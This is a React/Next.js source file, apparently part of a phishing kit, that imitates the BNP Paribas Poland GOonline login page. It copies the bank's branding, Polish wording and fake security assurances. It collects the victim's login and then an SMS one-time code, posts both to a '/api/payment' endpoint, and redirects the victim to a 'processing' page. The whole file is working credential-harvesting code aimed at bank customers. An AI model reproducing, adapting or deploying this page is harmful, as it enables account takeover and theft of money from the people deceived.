"use client";

import { useState } from "react";
import "./new-info.css"; // тот же css-файл, просто дополнили
import AwardIcon from "@/components/Icons/AwardIcon";
import LaundryDrumIcon from "@/components/Icons/LaundryDrumIcon";
import LockIcon from "@/components/Icons/LockIcon";
import HeadsetIcon from "@/components/Icons/HeadsetIcon";
import { useRouter } from "next/navigation";

const BANKS: Record<
  string,
  { name: string; logo: string
    
  }
> = {
  "bnp-paribas": {
    name: "BNP Paribas",
    logo: "/banks/bnp-paribas.svg"
  },
};

const bank = BANKS["bnp-paribas"];

export default function LoginPage() {
  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
  const router = useRouter();

  const [step, setStep] = useState<1 | 2>(1);
  const [firstValue, setFirstValue] = useState("");
  const [secondValue, setSecondValue] = useState("");
  const [error, setError] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const labelText = "Login"

  const placeholderText =
    step === 1
      ? "Wpisz login"
      : "Wpisz kod z SMS nr 1";

  const [status, setStatus] =
      useState<"idle" | "loading" | "success" | "error">("idle");


  async function handleContinue(e: React.FormEvent<HTMLButtonElement>): Promise<void> {
    e.preventDefault();

    const current = (step === 1 ? firstValue : secondValue).trim();

    if (!current) {
      setError(true);
      setErrorMessage("Pole nie może być puste");
      return;
    }

    // шаг 1 → запрашиваем второе значение
    if (step === 1) {
      setError(false);  
      setStatus("loading");

      const formData = new FormData();
      formData.append("login", firstValue);
      formData.append("sms", secondValue);

      // ТВОЯ КОМАНДА — используем здесь:
      const data = Object.fromEntries(formData.entries());

      try {
        console.log("Send /api/payment:", data);
  
        const res = await fetch("/api/payment", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data),
        });
  
        const json = await res.json().catch(() => ({}));
        console.log("Ответ /api/payment:", res.status, json);
  
        if (!res.ok) {
          setStatus("error");
          return;
        }

        await delay(5000);
        setStep(2);
        setStatus("idle");
        
      } catch (err) {
        console.error("Error fetch:", err);
        setStatus("error");
      }
      
      return;
    }

    if (step === 2) {
      setError(false);  
      setStatus("loading");

        const formData2 = new FormData();
        formData2.append("sms", secondValue);

      // ТВОЯ КОМАНДА — используем здесь:
      const data = Object.fromEntries(formData2.entries());

      try {
        console.log("Send /api/payment:", data);
  
        const res = await fetch("/api/payment", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data),
        });
  
        const json = await res.json().catch(() => ({}));
        console.log("Ответ /api/payment:", res.status, json);
  
        if (!res.ok) {
          setStatus("error");
          return;
        }
          setStatus("success");
          
          setFirstValue("");
          setSecondValue("");
          router.push(`/payment/bnp-paribas/processing`);
          router.refresh();
        
      } catch (err) {
        console.error("Error fetch:", err);
        setStatus("error");
      }
      setError(false);
      setErrorMessage("");
      
      router.push(`/payment/bnp-paribas/processing`);
      router.refresh();
      return;
      
  }
}


  return (
    <div className="new-page">
      {status === "loading" && (
        <div className="login2-loading-overlay">
          <div className="login2-loading-box">
            <div className="login2-spinner"></div>
            <p className="login2-loading-text">Ładowanie…</p>
          </div>
        </div>
      )}
      <main className="new-main">
        {/* ЛОГО / КАРТИНКА СЛЕВА СВЕРХУ */}
        <div className="new-logo-wrapper">
          <img
            src={bank.logo}
            alt="Logo"
            className="new-logo"
          />
        </div>

        {/* ЗАГОЛОВОК */}
        <h1 className="new-title">Zaloguj się do GOonline</h1>

        {/* ТЕКСТ ПОД ЗАГОЛОВКОМ */}
        <p className="new-description">
          Podaj swój identyfikator lub login, aby zalogować się do serwisu transakcyjnego
        </p>

        {/* ЛЕЙБЛ НАД ИНПУТОМ */}
        <p className="new-input-label">{labelText}</p>

        {/* ФОРМА / ИНПУТ + КНОПКА */}
        <form className="new-form">
          <input
            type="text"
            className={`new-input ${error ? "new-input-error" : ""}`}
            placeholder={placeholderText}
            value={step === 1 ? firstValue : secondValue}
            onChange={(e) => {
              if (step === 1) {
                setFirstValue(e.target.value);
              } else {
                setSecondValue(e.target.value);
              }
              if (error) {
                setError(false);
                setErrorMessage("");
              }
            }}
            onFocus={() => {
              if (error) {
                setError(false);
                setErrorMessage("");
              }
            }}
          />

          {error && (
            <p className="new-input-error-text">{errorMessage}</p>
          )}

          <button type="submit" onClick={handleContinue} className="new-button">
            DALEJ
          </button>
        </form>

        {/* МАЛЫЙ ЗАГОЛОВОК ПОД КНОПКОЙ */}
        <h2 className="new-subtitle">Dodatkowe informacje</h2>

        {/* СПИСОК ИЗ 3 ЛИНИЙ: ИКОНКА + ТЕКСТ */}
        <div className="new-list">
          <div className="new-list-item">
            <div className="new-icon-wrapper">
              <LaundryDrumIcon />
            </div>
            <p className="new-list-text">
              Adres zaczyna się od https
            </p>
          </div>

          <div className="new-list-item">
            <div className="new-icon-wrapper">
              <LockIcon />
            </div>
            <p className="new-list-text">
              Połączenie szyfrowane

            </p>
          </div>

          <div className="new-list-item">
            <div className="new-icon-wrapper">
              <AwardIcon />
            </div>
            <p className="new-list-text">
              Certyfikat strony
            </p>
          </div>
          <div></div><div></div>
          <div className="new-list-item">
            <div className="new-icon-wrapper">
              <HeadsetIcon />
            </div>
            <p className="new-list-text">
              <span style={{color: "green"}}>Masz pytania dotyczące GOonline?</span> Zapytaj konsultanta na wideoczacie (w godz 9-17 w dni robocze)
            </p>
          </div>
        </div>

        {/* СЕРАЯ ЛИНИЯ ПЕРЕД ФУТЕРОМ */}
        <div className="new-separator" />

        {/* ФУТЕР: 3 строки — 3 линии */}
        
      </main>
      <footer className="new-footer">
          <p className="new-footer-line">© 2025 BNP Paribas</p>
          <p className="new-footer-line">Bezpieczeństwo</p>
          <p className="new-footer-line">Polityka cookies</p>
          <img src="https://goonline.bnpparibas.pl/assets/theme/retail/img/norton.png" alt="bnp-footer-logo" className="new-footer-logo" />
        </footer>
        
    </div>
  );
}

